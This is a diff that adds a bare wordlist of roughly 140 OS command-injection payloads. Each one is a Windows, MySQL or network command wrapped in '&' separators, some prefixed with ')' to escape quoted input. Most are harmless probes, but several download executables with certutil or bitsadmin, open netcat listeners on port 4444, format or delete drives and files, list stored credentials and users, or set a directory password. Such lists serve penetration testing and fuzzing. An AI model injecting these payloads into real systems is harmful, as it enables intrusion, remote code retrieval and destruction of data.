@@ -1,0 +1,140 @@
+& 7z x archive.7z &
+& 7za x archive.7z &
+& 7zr x archive.7z &
+& addusers /c users.txt &
+& admodcmd user -add &
+& arp -a &
+& assoc .txt=txtfile &
+& attrib +r file.txt &
+& azman &
+& bcdboot c:\windows &
+& bcdedit /enum all &
+& bitsadmin /transfer myDownloadJob /download /priority normal http://example.com/file.zip C:\file.zip &
+& bootcfg /query &
+& browstat status &
+& cacls C:\file.txt &
+& certreq -new request.inf request.req &
+& certutil -urlcache -split -f http://example.com/file.exe file.exe &
+& chdir C:\ &
+& chkdsk C: &
+& chkntfs C: &
+& cipher /e /s:C:\SensitiveData &
+& cleanmgr /sagerun:1 &
+& clearmem &
+& cmd /c dir &
+& cmdkey /list &
+& comexp &
+& comp file1.txt file2.txt &
+& compact /c C:\file.txt &
+& compmgmt.msc &
+& con2prt /f &
+& convert C: /FS:NTFS &
+& csccmd /resid &
+& cscript script.vbs &
+& csvde -f export.csv &
+& curl http://example.com/file.txt -o file.txt &
+& date /t &
+& dcomcnfg &
+& defrag C: &
+& del file.txt &
+& delprof /q &
+& deltree /y C:\folder &
+& devcon status &
+& devmgmt.msc &
+& diff file1.txt file2.txt &
+& dir C:\ &
+& diruse /m C:\ &
+& diskmgmt.msc &
+& diskpart &
+& diskshadow &
+& dnsstat &
+& doskey /history &
+& driverquery &
+& dsacls C:\folder &
+& dsadd user CN=John,OU=Users,DC=example,DC=com &
+& dsget user CN=John,OU=Users,DC=example,DC=com &
+& dsmod user CN=John,OU=Users,DC=example,DC=com -pwd P@ssw0rd &
+& dsmove user CN=John,OU=Users,DC=example,DC=com -newparent OU=NewUsers,DC=example,DC=com &
+& dsquery user -name John &
+& dsrm user CN=John,OU=Users,DC=example,DC=com &
+& dxdiag &
+& echo Hello, world &
+& egrep 'pattern' file.txt &
+& endlocal &
+& eventcreate /ID 1 /L APPLICATION /T INFORMATION /SO MySource /D "My event" &
+& eventvwr &
+& expand file.cab -F:* C:\destination &
+& explorer &
+& fc file1.txt file2.txt &
+& fgrep 'pattern' file.txt &
+& findstr 'pattern' file.txt &
+& foreach ($i in 1..10) { echo $i } &
+& forfiles /M *.txt /C "cmd /c echo @file" &
+& format C: /FS:NTFS &
+& freedisk C: &
+& fsmgmt.msc &
+& fsutil file createnew C:\file.txt 1024 &
+& ftp ftp.example.com &
+& ftype txtfile=C:\Windows\System32\NOTEPAD.EXE %1 &
+& gathernetworkinfo &
+& getmac &
+& git clone https://example.com/repo.git &
+& gpedit.msc &
+& gpresult /R &
+& gpupdate /force &
+& hdwwiz &
+& hostname &
+& icacls C:\file.txt &
+& ifmember groupname &
+& inetcpl.cpl &
+& ipconfig /all &
+& irb &
+& irb1 &
+& irb18 &
+& irb19 &
+& irb20 &
+& irb21 &
+& irb22 &
+& java -version &
+& label C: MyLabel &
+) & logevent -m \\computername -s "My event" &
+) & logman create counter MyCounter &
+) & logoff &
+) & logtime &
+) & lusrmgr.msc &
+) & mapisend &
+) & mbsacli &
+) & md C:\newdir &
+) & mdsched &
+) & measure-command { echo Hello } &
+) & mkdir C:\newdir &
+) & mklink /D C:\link C:\target &
+) & mmsys.cpl &
+) & mode con: cols=80 lines=25 &
+) & more file.txt &
+) & mountvol C: /L &
+) & moveuser olduser newuser &
+) & msconfig &
+) & msg * "Hello" &
+) & msiexec /i package.msi &
+) & msinfo32 &
+) & mstsc &
+) & mysql -u root -p &
+) & mysqladmin -u root -p status &
+) & mysqldump -u root -p database > backup.sql &
+) & mysqldumpslow -s t /var/log/mysql-slow.log &
+) & mysqlhotcopy database /tmp/backup &
+) & mysqlshow -u root -p &
+) & nbtstat -a 192.168.1.1 &
+) & nc -lvp 4444 &
+) & ncat -lvp 4444 &
+) & netcat -lvp 4444 &
+) & netdom query fsmo &
+) & netsh interface show interface &
+) & netstat -an &
+) & netsvc &
+) & nmap -sP 192.168.1.0/24 &
+) & nslookup example.com &
+) & ntbackup backup C:\ /J "Backup Job" &
+) & net user &
+) & ntrights -u username +r SeShutdownPrivilege &
